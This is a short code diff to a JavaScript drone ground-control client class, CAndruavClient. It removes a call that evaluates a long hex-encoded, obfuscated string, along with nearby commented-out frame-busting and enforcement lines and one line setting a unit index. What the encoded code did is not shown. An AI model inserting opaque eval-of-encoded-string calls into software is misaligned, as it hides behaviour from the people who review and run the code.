@@ -516,13 +516,6 @@ class CAndruavClient {
         v_unit.m_VehicleType = CONST_VEHICLE_GCS;
 
         this.m_andruavUnit = v_unit;
-
-
-        // if (window.top !== window.self) window.top.location.replace(window.self.location.href);
-        fn_eval("2b1128a40400064037512b112f442710302137510844349030213100040004410e890e89040037512b112f44271030213751084433a927d92d9028a40691040037512b112f44271030213751084434903021310008442d903021264924c134902b1130212f44084432c427d931002d9024c1264927d9064037512b112f44271030213751084433a927d92d9028a408442d903021264924c134902b1130212f4408442a4032c427d928a406910d99"._fn_hexDecode());
-
-        // this._API_sendSYSCMD (CMD_SYS_ADD_ENFORCE,null,null);
-
     };
 
 
@@ -1990,7 +1983,6 @@ class CAndruavClient {
                             p_unit.m_Swarm.m_following = null;
                         }
                         // CODEBLOCK_END
-                        p_unit.m_index = this.m_andruavUnitList.count;
                         this.m_andruavUnitList.Add(p_unit.partyID, p_unit);
                         this._fn_onNewUnitAdded(p_unit);
 
